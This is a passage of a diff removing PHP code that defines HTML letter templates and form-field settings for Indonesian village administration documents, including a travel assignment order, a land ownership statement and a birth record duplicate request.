-                                        <td style="width: 66.5597%; height: 18.75px;">\u{a0}</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 4.45854%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 28.9805%; height: 18.75px;">\u{a0}</td>
-                                        <td style="width: 66.5597%; height: 18.75px;">\u{a0}</td>
-                                    </tr>
-                                    <tr style="height: 18.75px;">
-                                        <td style="width: 4.45854%; height: 18.75px;">\u{a0}</td>
-                                        <td style="height: 18.75px; width: 95.5402%;" colspan="2">(
-                                            ................................... )</td>
-                                    </tr>
-                                </tbody>
-                            </table>
-                        </td>
-                    </tr>
-                    <tr style="height: 41.1133px;">
-                        <td style="width: 47.3086%; height: 41.1133px;" width="315">V. Tiba di : Kantor [Sebutan_desA] [Nama_desA]
-                            <br>Pada Tanggal : [Form_tanggal_kembalI]</td>
-                        <td style="width: 52.6865%; height: 41.1133px;" width="351"><em>Telah diperiksa dengan keterangan bahwa
-                                perjalan tersebut atas perintahnya dan semata-mata untuk kepentingan jabatan dalam waktu yang
-                                sesingkat-singkatnya</em></td>
-                    </tr>
-                    <tr style="height: 80.988px;">
-                        <td style="text-align: center; width: 99.9951%; height: 80.988px;" colspan="2" width="666">
-                            [Sebutan_kepala_desA] [Nama_desA] <br><br><br><br><strong>( [Nama_pamonG]</strong><strong>\u{a0})</strong>
-                        </td>
-                    </tr>
-                    <tr style="height: 58.2422px;">
-                        <td style="width: 99.9951%; height: 58.2422px;" colspan="2" width="666">VI. <u>PERHATIAN </u> <br>Pengguna
-                            Anggaran yang menerbitkan SPD, pegawai yang melakukan perjalanan dinas, para pejabat yang mengesahkan
-                            tanggal berangkat/tiba, \u{a0}\u{a0}\u{a0}serta bendahara pengeluaran bertanggungjawab berdasarkan Peraturan Keuangan
-                            Negara. Apabila Negara menderita \u{a0}rugi akibat \u{a0}kesalahan, kelalaian dan kealpaannya.</td>
-                    </tr>
-                </tbody>
-            </table>
-            <h4 style="margin: 0; text-align: center;">\u{a0}</h4>
-            <h4 style="margin: 0; text-align: center;">\u{a0}</h4>
-            <h4 style="margin: 0; text-align: center;">\u{a0}</h4>
-            <h4 style="margin: 0; text-align: center;">\u{a0}</h4>
-            <h4 style="margin: 0; text-align: center;"><span style="text-decoration: underline;">[JUdul_surat]</span></h4>
-            <p style="margin: 0; text-align: center;">Nomor : [Format_nomor_suraT]</p>
-            <p style="text-indent: 30px; text-align: center;"><strong>MEMERINTAHKAN</strong></p>
-            <table style="border-collapse: collapse; width: 95%; margin-left: auto; margin-right: auto;">
-                <tbody>
-                    <tr>
-                        <td width="20">1.</td>
-                        <td width="50">Nama</td>
-                        <td width="5">:</td>
-                        <td width="600"><strong>[NaMA]</strong></td>
-                    </tr>
-                    <tr>
-                        <td width="20">\u{a0}</td>
-                        <td width="50">Jabatan</td>
-                        <td width="5">:</td>
-                        <td width="600">[Form_jabataninstansI]</td>
-                    </tr>
-                    <tr>
-                        <td width="20">\u{a0}</td>
-                        <td width="50">Alamat</td>
-                        <td width="5">:</td>
-                        <td width="600">[AlamaT] [Sebutan_desA] [Nama_desA] : [Kode_desA]</td>
-                    </tr>
-                    <tr>
-                        <td width="20">\u{a0}</td>
-                        <td width="50">\u{a0}</td>
-                        <td width="5">\u{a0}</td>
-                        <td width="600">[Sebutan_kecamataN] [Nama_kecamataN] : [Kode_kecamataN]</td>
-                    </tr>
-                    <tr>
-                        <td width="20">2.</td>
-                        <td width="50">Maksud Tugas</td>
-                        <td width="5">:</td>
-                        <td width="600"><strong>[Form_maksud_perjalanan_dinaS]</strong></td>
-                    </tr>
-                    <tr>
-                        <td width="20">\u{a0}</td>
-                        <td width="50">Tujuan</td>
-                        <td width="5">:</td>
-                        <td width="600">[Form_tempat_tujuaN]</td>
-                    </tr>
-                    <tr>
-                        <td width="20">\u{a0}</td>
-                        <td width="50">Tanggal</td>
-                        <td width="5">:</td>
-                        <td width="600">[Form_tanggal_berangkaT] s/d [Form_tanggal_kembalI]</td>
-                    </tr>
-                    <tr>
-                        <td width="20">\u{a0}</td>
-                        <td width="50">Pengikut</td>
-                        <td width="5">:</td>
-                        <td width="600">
-                            <table>
-                                <tbody>
-                                    <tr>
-                                        <td>
-                                            <table width="100%">
-                                                <tbody>
-                                                    <tr>
-                                                        <td width="23">1.</td>
-                                                        <td width="283">[Form_nama_pengikut_I]</td>
-                                                    </tr>
-                                                    <tr>
-                                                        <td width="23">2.</td>
-                                                        <td width="283">[Form_nama_pengikut_iI]</td>
-                                                    </tr>
-                                                    <tr>
-                                                        <td width="23">3.</td>
-                                                        <td width="283">[Form_nama_pengikut_iiI]</td>
-                                                    </tr>
-                                                </tbody>
-                                            </table>
-                                        </td>
-                                        <td>
-                                            <table style="width: 59.6213%;">
-                                                <tbody>
-                                                    <tr>
-                                                        <td style="width: 8.73963%;" width="25">4.</td>
-                                                        <td style="width: 91.258%;" width="262">[Form_nama_pengikut_iV]</td>
-                                                    </tr>
-                                                    <tr>
-                                                        <td style="width: 8.73963%;" width="25">5.</td>
-                                                        <td style="width: 91.258%;" width="262">[Form_nama_pengikut_V]</td>
-                                                    </tr>
-                                                    <tr>
-                                                        <td style="width: 8.73963%;" width="25">6.</td>
-                                                        <td style="width: 91.258%;" width="262">[Form_nama_pengikut_vI]</td>
-                                                    </tr>
-                                                </tbody>
-                                            </table>
-                                        </td>
-                                    </tr>
-                                </tbody>
-                            </table>
-                        </td>
-                    </tr>
-                </tbody>
-            </table>
-            <p>\u{a0}</p>
-            <p style="text-align: justify; text-indent: 30px;">Demikian Surat Tugas ini dikeluarkan untuk dilaksanakan sebagaimana
-                mestinya.</p>
-            <p style="text-align: justify; text-indent: 30px;">.</p>
-            <table style="border-collapse: collapse; width: 32.5353%;" border="0" align="right">
-                <tbody>
-                    <tr style="height: 18.75px;">
-                        <td style="width: 100%; text-align: left;">[Nama_desA], [TgL_surat]</td>
-                    </tr>
-                    <tr style="height: 18.75px;">
-                        <td style="width: 100%; height: 18.75px; text-align: left;">[Sebutan_kepala_desA] [Nama_desA]</td>
-                    </tr>
-                    <tr style="height: 75px;">
-                        <td style="width: 100%; height: 75px;">\u{a0}</td>
-                    </tr>
-                    <tr style="height: 18.75px;">
-                        <td style="width: 100%; text-align: center; height: 18.75px;">\u{a0}</td>
-                    </tr>
-                    <tr style="height: 18.75px;">
-                        <td style="width: 100%; text-align: left; height: 18.75px;"><strong>[Nama_pamonG]</strong></td>
-                    </tr>
-                </tbody>
-            </table>
-            <p><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br>
-            </p>
-            <p>\u{a0}</p>
-            <h4 style="margin: 0; text-align: center;"><span style="text-decoration: underline;">HASIL
-                    BIMTEK/PELATIHAN/KONSULTASI/MONEV/PENGIRIMAN DATA, DLL</span></h4>
-            <div><br>Sebagai berikut :<br><br>1.<br>2.<br>3.</div>
-            HTML;
-        $data = [
-            'nama'                => $nama_surat,
-            'kode_surat'          => 'S-46',
-            'masa_berlaku'        => 1,
-            'satuan_masa_berlaku' => 'M',
-            'orientasi'           => 'Potrait',
-            'ukuran'              => 'F4',
-            'margin'              => '{"kiri":1.78,"atas":0.63,"kanan":1.78,"bawah":1.37}',
-            'qr_code'             => StatusEnum::TIDAK,
-            'kode_isian'          => '[{"tipe":"text","kode":"[form_pangkat_dan_golongan]","nama":"Pangkat dan Golongan","deskripsi":"Pangkat dan Golongan","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_jabataninstansi]","nama":"Jabatan\/Instansi","deskripsi":"Jabatan\/Instansi","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_tingkat_biaya_perjalanan]","nama":"Tingkat Biaya Perjalanan","deskripsi":"Tingkat Biaya Perjalanan","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"textarea","kode":"[form_maksud_perjalanan_dinas]","nama":"Maksud Perjalanan Dinas","deskripsi":"Maksud Perjalanan Dinas","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_tempat_tujuan]","nama":"Tempat Tujuan","deskripsi":"Tempat Tujuan","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_alat_angkut_yang_digunakan]","nama":"Alat Angkut Yang Digunakan","deskripsi":"Alat Angkut Yang Digunakan","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_nama_pengikut_i]","nama":"Nama Pengikut I","deskripsi":"Nama Pengikut I","atribut":null,"pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_nama_pengikut_ii]","nama":"Nama Pengikut II","deskripsi":"Nama Pengikut II","atribut":null,"pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_nama_pengikut_iii]","nama":"Nama Pengikut III","deskripsi":"Nama Pengikut III","atribut":null,"pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_nama_pengikut_iv]","nama":"Nama Pengikut IV","deskripsi":"Nama Pengikut IV","atribut":null,"pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_nama_pengikut_v]","nama":"Nama Pengikut V","deskripsi":"Nama Pengikut V","atribut":null,"pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_nama_pengikut_vi]","nama":"Nama Pengikut VI","deskripsi":"Nama Pengikut VI","atribut":null,"pilihan":null,"refrensi":null},{"tipe":"textarea","kode":"[form_keterangan_lain]","nama":"Keterangan Lain","deskripsi":"Keterangan Lain","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"date","kode":"[form_tanggal_berangkat]","nama":"Tanggal Berangkat","deskripsi":"Tanggal Berangkat","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"date","kode":"[form_tanggal_kembali]","nama":"Tanggal Kembali","deskripsi":"Tanggal Kembali","atribut":"class=\"required\"","pilihan":null,"refrensi":null}]',
-            'form_isian'          => '{"data":"1","individu":{"sex":"","status_dasar":"","kk_level":""}}',
-            'mandiri'             => StatusEnum::TIDAK,
-            'syarat_surat'        => null,
-            'template'            => $template,
-        ];
-
-        return $hasil && $this->tambah_surat_tinymce($data, $id);
-    }
-
-    protected function suratKeteranganKepemilikanTanah($hasil, $id)
-    {
-        $template = <<<HTML
-                    <h4 style="margin: 0; text-align: center;"><span style="text-decoration: underline;">[JUdul_surat]</span></h4>
-                    <p style="margin: 0; text-align: center;">Nomor : [Format_nomor_suraT]<br /><br /></p>
-                    <p style="text-indent: 30px; text-align: justify;">Yang bertanda tangan di bawah ini :</p>
-                    <table style="border-collapse: collapse; width: 100.114%; height: 42px;" border="0" cellspacing="0" cellpadding="0">
-                    <tbody>
-                    <tr style="height: 21px;">
-                    <td style="width: 30px; text-align: center; height: 21px;">\u{a0}</td>
-                    <td style="width: 20.5239%; text-align: left; height: 21px;">Nama</td>
-                    <td style="width: 1.14525%; height: 21px; text-align: left;">:</td>
-                    <td style="width: 76.445%; height: 21px; text-align: justify;"><strong>[NAma]</strong></td>
-                    </tr>
-                    <tr style="height: 21px;">
-                    <td style="width: 30px; text-align: center; height: 21px;">\u{a0}</td>
-                    <td style="width: 20.5239%; text-align: left; height: 21px;">Jabatan</td>
-                    <td style="width: 1.14525%; height: 21px; text-align: left;">:</td>
-                    <td style="width: 76.445%; text-align: justify; height: 21px;">[JabataN]</td>
-                    </tr>
-                    </tbody>
-                    </table>
-                    <p style="text-align: justify; text-indent: 30px;">Dengan ini menerangkan bahwa :</p>
-                    <table style="border-collapse: collapse; width: 100%; height: 118.922px;" border="0" cellspacing="0" cellpadding="0">
-                    <tbody>
-                    <tr style="height: 19.8125px;">
-                    <td style="width: 30px; text-align: center; height: 19.8125px;">\u{a0}</td>
-                    <td style="width: 20.6571%; text-align: left; height: 19.8125px;">Nama  </td>
-                    <td style="width: 1.03204%; height: 19.8125px; text-align: left;">:</td>
-                    <td style="width: 76.5364%; height: 19.8125px; text-align: justify;">[NamA]</td>
-                    </tr>
-                    <tr style="height: 19.8125px;">
-                    <td style="width: 30px; text-align: center; height: 19.8125px;">\u{a0}</td>
-                    <td style="width: 20.6571%; text-align: left; height: 19.8125px;">Tempat / Tanggal Lahir</td>
-                    <td style="width: 1.03204%; height: 19.8125px; text-align: left;">:</td>
-                    <td style="width: 76.5364%; height: 19.8125px; text-align: justify;">[TempatlahiR] / [TanggallahiR]</td>
-                    </tr>
-                    <tr style="height: 19.8125px;">
-                    <td style="width: 30px; text-align: center; height: 19.8125px;">\u{a0}</td>
-                    <td style="width: 20.6571%; text-align: left; height: 19.8125px;">Umur</td>
-                    <td style="width: 1.03204%; height: 19.8125px; text-align: left;">:</td>
-                    <td style="width: 76.5364%; text-align: justify; height: 19.8125px;">[UsiA]</td>
-                    </tr>
-                    <tr style="height: 19.8125px;">
-                    <td style="width: 30px; text-align: center; height: 19.8125px;">\u{a0}</td>
-                    <td style="width: 20.6571%; text-align: left; height: 19.8125px;">Jenis Kelamin</td>
-                    <td style="width: 1.03204%; height: 19.8125px; text-align: left;">:</td>
-                    <td style="width: 76.5364%; height: 19.8125px; text-align: justify;">[Jenis_kelamiN]</td>
-                    </tr>
-                    <tr style="height: 19.8125px;">
-                    <td style="width: 30px; text-align: center; height: 19.8125px;">\u{a0}</td>
-                    <td style="width: 20.6571%; text-align: left; height: 19.8125px;">Pekerjaan</td>
-                    <td style="width: 1.03204%; height: 19.8125px; text-align: left;">:</td>
-                    <td style="width: 76.5364%; text-align: justify; height: 19.8125px;">[PekerjaaN]</td>
-                    </tr>
-                    <tr style="height: 19.8594px;">
-                    <td style="width: 30px; text-align: center; height: 19.8594px;">\u{a0}</td>
-                    <td style="width: 20.6571%; text-align: left; height: 19.8594px;">Alamat</td>
-                    <td style="width: 1.03204%; height: 19.8594px; text-align: left;">:</td>
-                    <td style="width: 76.5364%; text-align: justify; height: 19.8594px;">[AlamaT]</td>
-                    </tr>
-                    </tbody>
-                    </table>
-                    <p style="text-indent: 30px; text-align: justify;">Adalah benar-benar penduduk [Sebutan_desA] [NaMa_desa], yang memiliki/menguasai tanah/lahan berupa <strong>[FOrm_jenis_tanah]</strong> atas nama <strong>[Form_atas_namA]</strong>, yang berada di [Sebutan_desA] [NaMa_desa]. Tercatat dalam <strong>[FOrm_bukti_kepemilikan]</strong>, Nomor : <strong>[Form_nomor_bukti_kepemilikaN]</strong>, Luas :<strong>[Form_luas_tanaH]</strong>M<sup>2</sup>, dengan batas-batas :</p>
-                    <table style="border-collapse: collapse; width: 100%; height: 72px;" border="0">
-                    <tbody>
-                    <tr style="height: 18px;">
-                    <td style="width: 30px; height: 18px;">\u{a0}</td>
-                    <td style="width: 20.2564%; height: 18px;">Sebelah Utara</td>
-                    <td style="width: 1.14646%; height: 18px;">:</td>
-                    <td style="width: 76.5937%; height: 18px;">[Form_batas_sebelah_utarA]</td>
-                    </tr>
-                    <tr style="height: 18px;">
-                    <td style="width: 30px; height: 18px;">\u{a0}</td>
-                    <td style="width: 20.2564%; height: 18px;">Sebelah Timur</td>
-                    <td style="width: 1.14646%; height: 18px;">:</td>
-                    <td style="width: 76.5937%; height: 18px;">[Form_batas_sebelah_timuR]</td>
-                    </tr>
-                    <tr style="height: 18px;">
-                    <td style="width: 30px; height: 18px;">\u{a0}</td>
-                    <td style="width: 20.2564%; height: 18px;">Sebelah Selatan</td>
-                    <td style="width: 1.14646%; height: 18px;">:</td>
-                    <td style="width: 76.5937%; height: 18px;">[Form_batas_sebelah_selataN]</td>
-                    </tr>
-                    <tr style="height: 18px;">
-                    <td style="width: 30px; height: 18px;">\u{a0}</td>
-                    <td style="width: 20.2564%; height: 18px;">Sebelah Barat</td>
-                    <td style="width: 1.14646%; height: 18px;">:</td>
-                    <td style="width: 76.5937%; height: 18px;">[Form_batas_sebelah_baraT]</td>
-                    </tr>
-                    </tbody>
-                    </table>
-                    <ol>
-                    <li style="text-align: justify;">Tanah tersebut benar-benar <em>MILIK</em> yang bersangkutan dan <strong>tidak dalam keadaan sengketa</strong>.</li>
-                    <li style="text-align: justify;">Tanah tersebut berasal dari <strong>[FOrm_asal_kepmilikan_tanah]</strong> dan sampai dengan sekarang belum terdaftar / didaftarkan Hak nya ke BPN (belumditerbitkan : SIIM / SIIGB / SIIGU / LAINNYA)</li>
-                    <li style="text-align: justify;">Bukti pendukung kepemilikan sementara ini berupa <strong>[Form_bukti_pendukung_kepemilikan]</strong>.</li>
-                    </ol>
-                    <p style="text-indent: 30px;">Demikian surat ini dibuat, untuk dipergunakan sebagaimana mestinya.</p>
-                    <p style="text-align: justify; text-indent: 30px;"><br /><br /></p>
-                    <table style="border-collapse: collapse; width: 100%;" border="0">
-                    <tbody>
-                    <tr>
-                    <td style="width: 35%; text-align: center;">\u{a0}</td>
-                    <td style="width: 30%;">\u{a0}</td>
-                    <td style="width: 35%; text-align: center;">[NaMa_desa], [TgL_surat]</td>
-                    </tr>
-                    <tr>
-                    <td style="width: 35%; text-align: center;">Pemilih</td>
-                    <td style="width: 30%;">\u{a0}</td>
-                    <td style="width: 35%; text-align: center;">[Atas_namA]</td>
-                    </tr>
-                    <tr>
-                    <td style="width: 35%; text-align: center;">\u{a0}</td>
-                    <td style="width: 30%;"><br /><br /><br /><br /></td>
-                    <td style="width: 35%;">\u{a0}</td>
-                    </tr>
-                    <tr>
-                    <td style="width: 35%; text-align: center;">[NAma]</td>
-                    <td style="width: 30%;">\u{a0}</td>
-                    <td style="width: 35%; text-align: center;">[Nama_pamonG]</td>
-                    </tr>
-                    <tr>
-                    <td style="width: 35%;">\u{a0}</td>
-                    <td style="width: 30%;">\u{a0}</td>
-                    <td style="width: 35%; text-align: center;">[SEbutan_nip_desa] : [nip_pamong]</td>
-                    </tr>
-                    </tbody>
-                    </table>
-                    <div style="text-align: center;"><br />[qr_code]</div>
-            HTML;
-        $data = [
-            'nama'                => 'Keterangan Kepemilikan Tanah',
-            'kode_surat'          => 'S-49',
-            'masa_berlaku'        => 1,
-            'satuan_masa_berlaku' => 'd',
-            'orientasi'           => 'Potrait',
-            'ukuran'              => 'F4',
-            'margin'              => '{"kiri":1.78,"atas":0.63,"kanan":1.78,"bawah":1.37}',
-            'qr_code'             => StatusEnum::TIDAK,
-            'kode_isian'          => '[{"tipe":"select-manual","kode":"[form_jenis_tanah]","nama":"Jenis Tanah","deskripsi":"- Pilih Jenis Tanah -","atribut":"class=\"required\"","pilihan":["Tanah Sawah","Tanah Darat","Tanah Bangunan"],"refrensi":null},{"tipe":"number","kode":"[form_luas_tanah]","nama":"Luas Tanah","deskripsi":"Luas Tanah (dalam M2)","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"select-manual","kode":"[form_bukti_kepemilikan]","nama":"Bukti Kepemilikan","deskripsi":"- Pilih Bukti Kepemilikan Tanah -","atribut":"class=\"required\"","pilihan":["Petok lama","Petok baru","Sit segel","Akta","Copy","Buku Krawangan Desa","Lainnya"],"refrensi":null},{"tipe":"text","kode":"[form_nomor_bukti_kepemilikan]","nama":"Nomor Bukti Kepemilikan","deskripsi":"- Nomor Bukti Kepemilikan -","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_atas_nama]","nama":"Atas Nama","deskripsi":"Atas Nama","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"select-manual","kode":"[form_asal_kepmilikan_tanah]","nama":"Asal Kepmilikan Tanah","deskripsi":"- Pilih Asal Kepemilikan Tanah -","atribut":"class=\"required\"","pilihan":["Yayasan","Warisan","Hibah","Jual Beli","Lainnya"],"refrensi":null},{"tipe":"text","kode":"[form_bukti_pendukung_kepemilikan]","nama":"Bukti Pendukung Kepemilikan","deskripsi":"Bukti Pendukung Kepemilikan","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_batas_sebelah_utara]","nama":"Batas Sebelah Utara","deskripsi":"Batas Sebelah Utara","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_batas_sebelah_timur]","nama":"Batas Sebelah Timur","deskripsi":"Batas Sebelah Timur","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_batas_sebelah_selatan]","nama":"Batas Sebelah Selatan","deskripsi":"Batas Sebelah Selatan","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_batas_sebelah_barat]","nama":"Batas Sebelah Barat","deskripsi":"Batas Sebelah Barat","atribut":"class=\"required\"","pilihan":null,"refrensi":null}]',
-            'form_isian'          => '{"data":"1","individu":{"sex":"","status_dasar":"","kk_level":""}}',
-            'mandiri'             => StatusEnum::TIDAK,
-            'syarat_surat'        => null,
-            'lampiran'            => null,
-            'template'            => $template,
-        ];
-
-        return $hasil && $this->tambah_surat_tinymce($data, $id);
-    }
-
-    protected function suratPermohonanDuplikatKelahiran($hasil, $id)
-    {
-        $template = <<<HTML
-                <h4 style="margin: 0; text-align: center;"><span style="text-decoration: underline;">[JUdul_surat]</span></h4>
-                <p style="margin: 0; text-align: center;">Nomor : [Format_nomor_suraT]<br /><br /></p>
-                <p style="text-align: justify; text-indent: 30px;">YDengan ini kami mengajukan orang untuk mengadakan [Judul_suraT] seperti tersebut di bawah ini\u{a0} :</p>
-                <table style="border-collapse: collapse; width: 100%; height: 481.547px;" border="0" cellspacing="0" cellpadding="0">
-                <tbody>
-                <tr style="height: 19.375px;" valign="top">
-                <td style="width: 4.3222%; text-align: center; height: 19.375px;">\u{a0}</td>
-                <td style="width: 3.92927%; height: 19.375px; text-align: left;">1.</td>
-                <td style="width: 30.5174%; text-align: left; height: 19.375px;">Nama Lengkap</td>
-                <td style="width: 1.24427%; text-align: center; height: 19.375px;">:</td>
-                <td style="width: 59.9869%; height: 19.375px; text-align: justify;"><strong>[NAma]</strong></td>
-                </tr>
-                <tr style="height: 19.375px;" valign="top">
-                <td style="width: 4.3222%; text-align: center; height: 19.375px;">\u{a0}</td>
-                <td style="width: 3.92927%; height: 19.375px; text-align: left;">2.</td>
-                <td style="width: 30.5174%; text-align: left; height: 19.375px;">NIK / No KTP</td>
-                <td style="width: 1.24427%; text-align: center; height: 19.375px;">:</td>
-                <td style="width: 59.9869%; height: 19.375px; text-align: justify;">[NiK]</td>
-                </tr>
-                <tr style="height: 19.375px;" valign="top">
-                <td style="width: 4.3222%; text-align: center; height: 19.375px;">\u{a0}</td>
-                <td style="width: 3.92927%; height: 19.375px; text-align: left;">3.</td>
-                <td style="width: 30.5174%; text-align: left; height: 19.375px;">Jenis Kelamin / Agama</td>
-                <td style="width: 1.24427%; text-align: center; height: 19.375px;">:</td>
-                <td style="width: 59.9869%; height: 19.375px; text-align: justify;">[Jenis_kelamiN] / [AgamA]</td>
-                </tr>
-                <tr style="height: 19.375px;" valign="top">
-                <td style="width: 4.3222%; text-align: center; height: 19.375px;">\u{a0}</td>
-                <td style="width: 3.92927%; height: 19.375px; text-align: left;">4.</td>
-                <td style="width: 30.5174%; text-align: left; height: 19.375px;">Alamat/Tempat Tinggal</td>
-                <td style="width: 1.24427%; text-align: center; height: 19.375px;">:</td>
-                <td style="width: 59.9869%; height: 19.375px; text-align: justify;">[AlamaT]</td>
-                </tr>
-                <tr style="height: 39.75px;">
-                <td style="width: 4.3222%; text-align: center; height: 39.75px;">\u{a0}</td>
-                <td style="width: 3.92927%; height: 39.75px; text-align: left;">\u{a0}</td>
-                <td style="width: 30.5174%; text-align: left; height: 39.75px;"><strong>Telah Lahir Pada :</strong></td>
-                <td style="width: 1.24427%; text-align: center; height: 39.75px;">\u{a0}</td>
-                <td style="width: 59.9869%; height: 39.75px; text-align: justify;">\u{a0}</td>
-                </tr>
-                <tr style="height: 19.375px;" valign="top">
-                <td style="width: 4.3222%; text-align: center; height: 19.375px;">\u{a0}</td>
-                <td style="width: 3.92927%; height: 19.375px; text-align: left;">5.</td>
-                <td style="width: 30.5174%; text-align: left; height: 19.375px;">Hari, Tanggal, Pukul</td>
-                <td style="width: 1.24427%; text-align: center; height: 19.375px;">:</td>
-                <td style="width: 59.9869%; height: 19.375px; text-align: justify;">[Form_hari_lahiR], [TanggallahiR], [Form_jam_lahiR]</td>
-                </tr>
-                <tr style="height: 19.375px;" valign="top">
-                <td style="width: 4.3222%; text-align: center; height: 19.375px;">\u{a0}</td>
-                <td style="width: 3.92927%; height: 19.375px; text-align: left;">6.</td>
-                <td style="width: 30.5174%; text-align: left; height: 19.375px;">Bertempat di</td>
-                <td style="width: 1.24427%; text-align: center; height: 19.375px;">:</td>
-                <td style="width: 59.9869%; height: 19.375px; text-align: justify;">[Form_tempat_lahiR]</td>
-                </tr>
-                <tr style="height: 19.375px;">
-                <td style="width: 4.3222%; text-align: center; height: 19.375px;">\u{a0}</td>
-                <td style="width: 3.92927%; height: 19.375px; text-align: left;">\u{a0}</td>
-                <td style="width: 30.5174%; text-align: left; height: 19.375px;"><strong>Dengan orang tua</strong>:</td>
-                <td style="width: 1.24427%; height: 19.375px; text-align: center;">\u{a0}</td>
-                <td style="width: 59.9869%; height: 19.375px; text-align: justify;">\u{a0}</td>
-                </tr>
-                <tr style="height: 19.375px;" valign="top">
-                <td style="width: 4.3222%; text-align: center; height: 19.375px;">\u{a0}</td>
-                <td style="width: 3.92927%; height: 19.375px; text-align: left;">7.</td>
-                <td style="width: 30.5174%; text-align: left; height: 19.375px;">Nama Ibu</td>
-                <td style="width: 1.24427%; text-align: center; height: 19.375px;">:</td>
-                <td style="width: 59.9869%; height: 19.375px; text-align: justify;">[Nama_ibU]</td>
-                </tr>
-                <tr style="height: 19.375px;" valign="top">
-                <td style="width: 4.3222%; text-align: center; height: 19.375px;">\u{a0}</td>
-                <td style="width: 3.92927%; height: 19.375px; text-align: left;">8.</td>
-                <td style="width: 30.5174%; text-align: left; height: 19.375px;">NIK / Tanggal Lahir Ibu</td>
-                <td style="width: 1.24427%; text-align: center; height: 19.375px;">:</td>
-                <td style="width: 59.9869%; height: 19.375px; text-align: justify;">[Nik_ibU] / [Tempatlahir_ibU]</td>
-                </tr>
-                <tr style="height: 19.375px;" valign="top">
-                <td style="width: 4.3222%; text-align: center; height: 19.375px;">\u{a0}</td>
-                <td style="width: 3.92927%; height: 19.375px; text-align: left;">9.</td>
-                <td style="width: 30.5174%; text-align: left; height: 19.375px;">Pekerjaan Ibu</td>
-                <td style="width: 1.24427%; text-align: center; height: 19.375px;">:</td>
-                <td style="width: 59.9869%; height: 19.375px; text-align: justify;">[Pekerjaan_ibU]</td>
-                </tr>
-                <tr style="height: 19.375px;" valign="top">
-                <td style="width: 4.3222%; text-align: center; height: 19.375px;">\u{a0}</td>
-                <td style="width: 3.92927%; height: 19.375px; text-align: left;">10.</td>
-                <td style="width: 30.5174%; text-align: left; height: 19.375px;">Alamat Ibu</td>
-                <td style="width: 1.24427%; text-align: center; height: 19.375px;">:</td>
-                <td style="width: 59.9869%; height: 19.375px; text-align: justify;">[Alamat_ibU] [Sebutan_desA] [Nama_desA], [Sebutan_kecamataN] [Nama_kecamataN], [Sebutan_kabupateN] [Nama_kabupateN]</td>
-                </tr>
-                <tr style="height: 19.4219px;" valign="top">
-                <td style="width: 4.3222%; text-align: center; height: 19.4219px;">\u{a0}</td>
-                <td style="width: 3.92927%; height: 19.4219px; text-align: left;">11.</td>
-                <td style="width: 30.5174%; text-align: left; height: 19.4219px;">Nama Ayah</td>
-                <td style="width: 1.24427%; text-align: center; height: 19.4219px;">:</td>
-                <td style="width: 59.9869%; height: 19.4219px; text-align: justify;">[Nama_ayaH]</td>
-                </tr>
-                <tr style="height: 19.2344px;" valign="top">
-                <td style="width: 4.3222%; text-align: center; height: 19.2344px;">\u{a0}</td>
-                <td style="width: 3.92927%; text-align: left; height: 19.2344px;">12.</td>
-                <td style="width: 30.5174%; text-align: left; height: 19.2344px;">NIK / Tanggal Lahir Ayah</td>
-                <td style="width: 1.24427%; text-align: center; height: 19.2344px;">:</td>
-                <td style="width: 59.9869%; text-align: justify; height: 19.2344px;">[Nik_ayaH] / [Tanggallahir_ayaH]</td>
-                </tr>
-                <tr style="height: 19.2344px;" valign="top">
-                <td style="width: 4.3222%; text-align: center; height: 19.2344px;">\u{a0}</td>
-                <td style="width: 3.92927%; text-align: left; height: 19.2344px;">13.</td>
-                <td style="width: 30.5174%; text-align: left; height: 19.2344px;">Pekerjaan Ayah</td>
-                <td style="width: 1.24427%; text-align: center; height: 19.2344px;">:</td>
-                <td style="width: 59.9869%; text-align: justify; height: 19.2344px;">[Pekerjaan_ayaH]\u{a0}</td>
-                </tr>
-                <tr style="height: 36px;" valign="top">
-                <td style="width: 4.3222%; text-align: center; height: 36px;">\u{a0}</td>
-                <td style="width: 3.92927%; text-align: left; height: 36px;">14.</td>
-                <td style="width: 30.5174%; text-align: left; height: 36px;">Alamat Ayah</td>
-                <td style="width: 1.24427%; text-align: center; height: 36px;">:</td>
-                <td style="width: 59.9869%; text-align: justify; height: 36px;">[Alamat_ayaH] [Sebutan_desA] [Nama_desA], [Sebutan_kecamataN] [Nama_kecamataN], [Sebutan_kabupateN] [Nama_kabupateN]</td>
-                </tr>
-                <tr style="height: 19.2344px;">
-                <td style="width: 4.3222%; text-align: center; height: 19.2344px;">\u{a0}</td>
-                <td style="width: 3.92927%; text-align: left; height: 19.2344px;">\u{a0}</td>
-                <td style="width: 30.5174%; text-align: left; height: 19.2344px;">\u{a0}</td>
-                <td style="width: 1.24427%; text-align: center; height: 19.2344px;">\u{a0}</td>
-                <td style="width: 59.9869%; text-align: justify; height: 19.2344px;">\u{a0}</td>
-                </tr>
-                <tr style="height: 19.2344px;">
-                <td style="width: 4.3222%; text-align: center; height: 19.2344px;">\u{a0}</td>
